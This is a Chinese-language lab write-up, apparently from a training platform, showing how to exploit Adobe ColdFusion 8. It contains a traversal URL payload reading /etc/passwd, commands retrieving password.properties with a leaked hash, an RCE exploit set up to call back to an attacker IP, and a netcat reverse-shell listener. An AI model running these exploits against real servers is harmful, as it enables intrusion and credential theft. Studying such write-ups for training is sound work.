# ColdFusion

> 商用的快速應用程式開發平台，在1995年由JJ Allaire開創。ColdFusion最初是為了建立能與[資料庫](https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93)連接的網站而開發的。2.0版本（1996年推出）以後，它成為了一個全面的開發平台,包括一個[整合式開發環境](https://zh.wikipedia.org/wiki/%E9%9B%86%E6%88%90%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83)以及功能全面的[手稿語言](https://zh.wikipedia.org/wiki/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80)。ColdFusion支援的[CFML](https://zh.wikipedia.org/w/index.php?title=CFML\&action=edit\&redlink=1)（ColdFusion Markup Language）是一種[手稿語言](https://zh.wikipedia.org/wiki/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80)，檔案以\*.cfm為[檔名](https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E5%90%8D)，在ColdFusion專用的應用伺服器環境下執行。cfm檔案被編譯器翻譯為對應的[C++](https://zh.wikipedia.org/wiki/C%2B%2B)語言程式，然後執行並向瀏覽器返回結果。它的設計思想被一些人認為非常先進，被一些語言所借鑑。



## **🔍 1. 發現點**

* **目標系統**: Adobe ColdFusion 8
* **已知漏洞**:
  1. **目錄遍歷 (Directory Traversal)** → CVE-2010-2861
  2. **遠端程式碼執行 (Remote Code Execution, RCE)** → CVE-2009-2265
*   **使用 `searchsploit` 尋找漏洞**：

    ```bash
    searchsploit adobe coldfusion
    ```

    **發現 ColdFusion 8 RCE & 目錄遍歷漏洞**

***

## **🚀 2. 測試Payload**

#### **📂 目錄遍歷 (CVE-2010-2861)**

*   **驗證漏洞**

    ```http
    http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
    ```
*   **使用 Searchsploit 複製並執行 PoC**

    ```bash
    searchsploit -p 14641
    cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
    python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
    ```
*   **成功獲取 `password.properties`**

    ```txt
    txt複製編輯rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP
    password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
    encrypted=true
    ```

#### **💀 RCE (CVE-2009-2265)**

*   **下載並執行 RCE Exploit**

    ```bash
    searchsploit -p 50057
    cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
    ```
*   **修改 Exploit 參數**

    ```python
    if __name__ == '__main__':
        lhost = '10.10.14.55'  # 攻擊者 VPN IP
        lport = 4444           # 監聽端口
        rhost = "10.129.247.30" # 目標 IP
        rport = 8500           # ColdFusion 端口
        filename = uuid.uuid4().hex
    ```
*   **執行攻擊**

    ```bash
    python3 50057.py
    ```

***

## **🎯 3. 取得反向 Shell**

*   **開始監聽**

    ```bash
    nc -lvnp 4444
    ```
*   **成功獲取遠端 Shell**

    ```txt
    Microsoft Windows [Version 6.1.7600]
    C:\ColdFusion8\runtime\bin>
    ```

***

## **🔗 5. 連鎖漏洞**

✅ **ColdFusion 8 目錄遍歷 → 洩露敏感文件 (`password.properties`)**\
✅ **利用 `password.properties` 嘗試解密管理密碼**\
✅ **ColdFusion 8 RCE → 上傳 Web Shell 獲取遠端存取**\
✅ **進一步提權或橫向移動**
